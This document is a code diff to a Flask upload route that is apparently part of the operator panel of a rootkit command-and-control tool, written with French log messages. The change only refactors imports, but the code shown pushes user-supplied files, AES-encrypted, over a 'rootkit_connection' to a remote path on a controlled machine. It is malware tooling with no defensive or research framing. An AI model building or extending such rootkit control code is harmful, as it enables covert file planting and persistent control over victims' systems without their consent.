@@ -1,6 +1,6 @@
 from flask import Blueprint, render_template, redirect, request, flash, url_for
 from werkzeug.utils import secure_filename
-from utils.state import authenticated, app, rootkit_connection
+import utils.state as state
 from utils.crypto import aes_encrypt
 from utils.socket_comm import send_to_server
 import os
@@ -9,7 +9,7 @@ upload_bp = Blueprint('upload', __name__)
 
 @upload_bp.route('/', methods=['GET', 'POST'])
 def upload():
-    if not authenticated:
+    if not state.authenticated:
         return redirect(url_for('auth.login'))
 
     if request.method == 'POST':
@@ -18,7 +18,7 @@ def upload():
 
         if uploaded_file and remote_path:
             filename = secure_filename(uploaded_file.filename)
-            local_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+            local_path = os.path.join(state.app.config['UPLOAD_FOLDER'], filename)
             uploaded_file.save(local_path)
 
             try:
@@ -35,7 +35,7 @@ def upload_file_encrypted(local_path, remote_path):
         return
 
     try:
-        send_to_server(rootkit_connection, f"upload {remote_path}")
+        send_to_server(state.rootkit_connection, f"upload {remote_path}")
 
         with open(local_path, "rb") as f:
             while True:
@@ -43,9 +43,9 @@ def upload_file_encrypted(local_path, remote_path):
                 if not chunk:
                     break
                 encrypted = aes_encrypt(chunk)
-                rootkit_connection.sendall(encrypted)
+                state.rootkit_connection.sendall(encrypted)
 
-        rootkit_connection.sendall(b"EOF\n")
+        state.rootkit_connection.sendall(b"EOF\n")
         print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")
 
     except Exception as e:
